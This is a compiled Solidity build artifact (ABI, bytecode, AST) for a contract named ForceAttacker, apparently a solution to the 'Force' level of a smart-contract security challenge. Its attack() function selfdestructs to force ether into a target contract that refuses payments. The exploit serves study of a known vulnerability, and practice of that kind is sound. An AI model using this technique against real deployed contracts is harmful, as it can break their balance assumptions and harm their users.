@@ -1,0 +1,397 @@
+{
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "_force",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "constructor"
+    },
+    {
+      "inputs": [],
+      "name": "attack",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "force",
+      "outputs": [
+        {
+          "internalType": "address",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "stateMutability": "payable",
+      "type": "receive"
+    }
+  ],
+  "bytecode": {
+    "object": "0x608060405234801561001057600080fd5b5060405161015938038061015983398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610084565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b60c7806100926000396000f3fe608060405260043610602a5760003560e01c80639e5faafc146035578063a79f26dc14604957600080fd5b36603057005b600080fd5b348015604057600080fd5b5060476083565b005b348015605457600080fd5b506000546067906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b6000546001600160a01b0316fffea2646970667358221220bb28f8d83856a51f17dd061e85741463a2be2111bb9b1e22f995db8a5a5436a164736f6c634300080f0033",
+    "sourceMap": "58:230:67:-:0;;;114:59;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;152:5;:14;;-1:-1:-1;;;;;;152:14:67;-1:-1:-1;;;;;152:14:67;;;;;;;;;;58:230;;14:290:124;84:6;137:2;125:9;116:7;112:23;108:32;105:52;;;153:1;150;143:12;105:52;179:16;;-1:-1:-1;;;;;224:31:124;;214:42;;204:70;;270:1;267;260:12;204:70;293:5;14:290;-1:-1:-1;;;14:290:124:o;:::-;58:230:67;;;;;;",
+    "linkReferences": {}
+  },
+  "deployedBytecode": {
+    "object": "0x608060405260043610602a5760003560e01c80639e5faafc146035578063a79f26dc14604957600080fd5b36603057005b600080fd5b348015604057600080fd5b5060476083565b005b348015605457600080fd5b506000546067906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b6000546001600160a01b0316fffea2646970667358221220bb28f8d83856a51f17dd061e85741463a2be2111bb9b1e22f995db8a5a5436a164736f6c634300080f0033",
+    "sourceMap": "58:230:67:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;179:72;;;;;;;;;;;;;:::i;:::-;;87:20;;;;;;;;;;-1:-1:-1;87:20:67;;;;-1:-1:-1;;;;;87:20:67;;;;;;-1:-1:-1;;;;;178:32:124;;;160:51;;148:2;133:18;87:20:67;;;;;;;179:72;237:5;;-1:-1:-1;;;;;237:5:67;216:28",
+    "linkReferences": {}
+  },
+  "methodIdentifiers": {
+    "attack()": "9e5faafc",
+    "force()": "a79f26dc"
+  },
+  "ast": {
+    "absolutePath": "src\\07-Force\\ForceAttacker.sol",
+    "id": 24664,
+    "exportedSymbols": {
+      "ForceAttacker": [
+        24663
+      ]
+    },
+    "nodeType": "SourceUnit",
+    "src": "32:256:67",
+    "nodes": [
+      {
+        "id": 24635,
+        "nodeType": "PragmaDirective",
+        "src": "32:24:67",
+        "literals": [
+          "solidity",
+          "^",
+          "0.8",
+          ".13"
+        ]
+      },
+      {
+        "id": 24663,
+        "nodeType": "ContractDefinition",
+        "src": "58:230:67",
+        "nodes": [
+          {
+            "id": 24637,
+            "nodeType": "VariableDeclaration",
+            "src": "87:20:67",
+            "constant": false,
+            "functionSelector": "a79f26dc",
+            "mutability": "mutable",
+            "name": "force",
+            "nameLocation": "102:5:67",
+            "scope": 24663,
+            "stateVariable": true,
+            "storageLocation": "default",
+            "typeDescriptions": {
+              "typeIdentifier": "t_address",
+              "typeString": "address"
+            },
+            "typeName": {
+              "id": 24636,
+              "name": "address",
+              "nodeType": "ElementaryTypeName",
+              "src": "87:7:67",
+              "stateMutability": "nonpayable",
+              "typeDescriptions": {
+                "typeIdentifier": "t_address",
+                "typeString": "address"
+              }
+            },
+            "visibility": "public"
+          },
+          {
+            "id": 24647,
+            "nodeType": "FunctionDefinition",
+            "src": "114:59:67",
+            "body": {
+              "id": 24646,
+              "nodeType": "Block",
+              "src": "142:31:67",
+              "statements": [
+                {
+                  "expression": {
+                    "id": 24644,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "leftHandSide": {
+                      "id": 24642,
+                      "name": "force",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 24637,
+                      "src": "152:5:67",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_address",
+                        "typeString": "address"
+                      }
+                    },
+                    "nodeType": "Assignment",
+                    "operator": "=",
+                    "rightHandSide": {
+                      "id": 24643,
+                      "name": "_force",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 24639,
+                      "src": "160:6:67",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_address",
+                        "typeString": "address"
+                      }
+                    },
+                    "src": "152:14:67",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address",
+                      "typeString": "address"
+                    }
+                  },
+                  "id": 24645,
+                  "nodeType": "ExpressionStatement",
+                  "src": "152:14:67"
+                }
+              ]
+            },
+            "implemented": true,
+            "kind": "constructor",
+            "modifiers": [],
+            "name": "",
+            "nameLocation": "-1:-1:-1",
+            "parameters": {
+              "id": 24640,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 24639,
+                  "mutability": "mutable",
+                  "name": "_force",
+                  "nameLocation": "134:6:67",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 24647,
+                  "src": "126:14:67",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_address",
+                    "typeString": "address"
+                  },
+                  "typeName": {
+                    "id": 24638,
+                    "name": "address",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "126:7:67",
+                    "stateMutability": "nonpayable",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address",
+                      "typeString": "address"
+                    }
+                  },
+                  "visibility": "internal"
+                }
+              ],
+              "src": "125:16:67"
+            },
+            "returnParameters": {
+              "id": 24641,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "142:0:67"
+            },
+            "scope": 24663,
+            "stateMutability": "nonpayable",
+            "virtual": false,
+            "visibility": "public"
+          },
+          {
+            "id": 24658,
+            "nodeType": "FunctionDefinition",
+            "src": "179:72:67",
+            "body": {
+              "id": 24657,
+              "nodeType": "Block",
+              "src": "206:45:67",
+              "statements": [
+                {
+                  "expression": {
+                    "arguments": [
+                      {
+                        "arguments": [
+                          {
+                            "id": 24653,
+                            "name": "force",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": 24637,
+                            "src": "237:5:67",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_address",
+                              "typeString": "address"
+                            }
+                          }
+                        ],
+                        "expression": {
+                          "argumentTypes": [
+                            {
+                              "typeIdentifier": "t_address",
+                              "typeString": "address"
+                            }
+                          ],
+                          "id": 24652,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": true,
+                          "lValueRequested": false,
+                          "nodeType": "ElementaryTypeNameExpression",
+                          "src": "229:8:67",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_type$_t_address_payable_$",
+                            "typeString": "type(address payable)"
+                          },
+                          "typeName": {
+                            "id": 24651,
+                            "name": "address",
+                            "nodeType": "ElementaryTypeName",
+                            "src": "229:8:67",
+                            "stateMutability": "payable",
+                            "typeDescriptions": {}
+                          }
+                        },
+                        "id": 24654,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": false,
+                        "kind": "typeConversion",
+                        "lValueRequested": false,
+                        "names": [],
+                        "nodeType": "FunctionCall",
+                        "src": "229:14:67",
+                        "tryCall": false,
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_address_payable",
+                          "typeString": "address payable"
+                        }
+                      }
+                    ],
+                    "expression": {
+                      "argumentTypes": [
+                        {
+                          "typeIdentifier": "t_address_payable",
+                          "typeString": "address payable"
+                        }
+                      ],
+                      "id": 24650,
+                      "name": "selfdestruct",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": -21,
+                      "src": "216:12:67",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_selfdestruct_nonpayable$_t_address_payable_$returns$__$",
+                        "typeString": "function (address payable)"
+                      }
+                    },
+                    "id": 24655,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "216:28:67",
+                    "tryCall": false,
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_tuple$__$",
+                      "typeString": "tuple()"
+                    }
+                  },
+                  "id": 24656,
+                  "nodeType": "ExpressionStatement",
+                  "src": "216:28:67"
+                }
+              ]
+            },
+            "functionSelector": "9e5faafc",
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "attack",
+            "nameLocation": "188:6:67",
+            "parameters": {
+              "id": 24648,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "194:2:67"
+            },
+            "returnParameters": {
+              "id": 24649,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "206:0:67"
+            },
+            "scope": 24663,
+            "stateMutability": "nonpayable",
+            "virtual": false,
+            "visibility": "external"
+          },
+          {
+            "id": 24662,
+            "nodeType": "FunctionDefinition",
+            "src": "257:29:67",
+            "body": {
+              "id": 24661,
+              "nodeType": "Block",
+              "src": "284:2:67",
+              "statements": []
+            },
+            "implemented": true,
+            "kind": "receive",
+            "modifiers": [],
+            "name": "",
+            "nameLocation": "-1:-1:-1",
+            "parameters": {
+              "id": 24659,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "264:2:67"
+            },
+            "returnParameters": {
+              "id": 24660,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "284:0:67"
+            },
+            "scope": 24663,
+            "stateMutability": "payable",
+            "virtual": false,
+            "visibility": "external"
+          }
+        ],
+        "abstract": false,
+        "baseContracts": [],
+        "canonicalName": "ForceAttacker",
+        "contractDependencies": [],
+        "contractKind": "contract",
+        "fullyImplemented": true,
+        "linearizedBaseContracts": [
+          24663
+        ],
+        "name": "ForceAttacker",
+        "nameLocation": "67:13:67",
+        "scope": 24664,
+        "usedErrors": []
+      }
+    ],
+    "license": "MIT"
+  },
+  "id": 67
+}
